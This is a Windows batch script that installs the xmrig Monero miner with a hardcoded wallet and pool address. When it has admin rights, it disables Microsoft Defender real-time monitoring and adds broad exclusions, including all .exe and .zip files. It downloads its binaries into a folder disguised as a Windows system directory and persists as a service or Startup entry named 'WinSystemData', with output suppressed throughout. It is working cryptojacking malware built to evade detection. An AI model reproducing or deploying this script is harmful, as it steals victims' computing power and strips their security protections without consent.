@echo off

set VERSION=2.5

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

set WALLET=483i5F8iiUbC3aU6SEse5iNJU4aXDgwLig9owqAxdJFCcq3bk4ik4T3ZwdPHwAMydUEFx8cY9QSwcgqPJsUsM8seRqSMDRM

for /f "delims=." %%a in ("%WALLET%") do set WALLET_BASE=%%a
call :strlen "%WALLET_BASE%", WALLET_BASE_LEN
if %WALLET_BASE_LEN% == 106 goto WALLET_LEN_OK
if %WALLET_BASE_LEN% ==  95 goto WALLET_LEN_OK
exit /b 1
:WALLET_LEN_OK

if ["%USERPROFILE%"] == [""] (
  exit /b 1
)

if not exist "%USERPROFILE%" (
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where tasklist >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

if %ADMIN% == 1 (
  where sc >NUL
  if not %errorlevel% == 0 (
    exit /b 1
  )
)

set /a "EXP_MONERO_HASHRATE = (%NUMBER_OF_PROCESSORS% * 700 * 30 + 50) / 100 / 1000"

if [%EXP_MONERO_HASHRATE%] == [] ( 
  exit /b 1
)

if %EXP_MONERO_HASHRATE% gtr 8192 ( set PORT=18192 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 4096 ( set PORT=14096 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 2048 ( set PORT=12048 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr 1024 ( set PORT=11024 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  512 ( set PORT=10512 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  256 ( set PORT=10256 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr  128 ( set PORT=10128 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   64 ( set PORT=10064 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   32 ( set PORT=10032 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr   16 ( set PORT=10016 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    8 ( set PORT=10008 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    4 ( set PORT=10004 & goto PORT_OK )
if %EXP_MONERO_HASHRATE% gtr    2 ( set PORT=10002 & goto PORT_OK )
set PORT=10001
:PORT_OK

set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"
set "LOGFILE=%MINER_DIR%\xmrig.log"

if %ADMIN% == 1 (
  powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionProcess 'nssm.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.zip' -Force" >NUL 2>NUL
  powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
  timeout 3 >NUL

)

sc stop WinSystemData
sc delete WinSystemData
taskkill /f /t /im xmrig.exe

:REMOVE_DIR0
timeout 5
rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR0

mkdir "%MINER_DIR%"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  goto MINER_BAD
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
"%MINER_DIR%\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD


for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  exit /b 1
)

:REMOVE_DIR1
timeout 5
rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR1

mkdir "%MINER_DIR%"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
"%MINER_DIR%\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK


exit /b 1

:MINER_OK


set PASS=node

if %NUMBER_OF_PROCESSORS% LEQ 2 (
    set CPU_USAGE=50
) else if %NUMBER_OF_PROCESSORS% EQU 4 (
    set CPU_USAGE=25
) else (
    set CPU_USAGE=30
)


powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"gulf.moneroocean.stream:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
set LOGFILE2=%LOGFILE:\=\\%
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"log-file\": *null,', '\"log-file\": \"%LOGFILE2%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 

copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL
powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'"
powershell -Command "$out = cat '%MINER_DIR%\config_background.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config_background.json'" 

(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /low %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo :EXIT
) > "%MINER_DIR%\miner.bat"

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

exit /b 1

:STARTUP_DIR_OK
(
echo @echo off
echo "%MINER_DIR%\miner.bat" --config="%MINER_DIR%\config_background.json"
) > "%STARTUP_DIR%\WinSystemData.bat"

call "%STARTUP_DIR%\WinSystemData.bat"
goto OK

:ADMIN_MINER_SETUP

if not exist "%MINER_DIR%" (
  mkdir "%MINER_DIR%"
  if errorlevel 1 (
    exit /b 1
  )
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

if not exist "%MINER_DIR%\nssm.exe" (
  exit /b 1
)
if not exist "%MINER_DIR%\xmrig.exe" (
  exit /b 1
)

sc stop WinSystemData
sc delete WinSystemData
"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
if errorlevel 1 (
  exit /b 1
)
"%MINER_DIR%\nssm.exe" set WinSystemData AppDirectory "%MINER_DIR%"
"%MINER_DIR%\nssm.exe" set WinSystemData AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%MINER_DIR%\nssm.exe" set WinSystemData AppStdout "%MINER_DIR%\stdout"
"%MINER_DIR%\nssm.exe" set WinSystemData AppStderr "%MINER_DIR%\stderr"

"%MINER_DIR%\nssm.exe" start WinSystemData
if errorlevel 1 (
  exit /b 1
)

goto OK

:OK
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b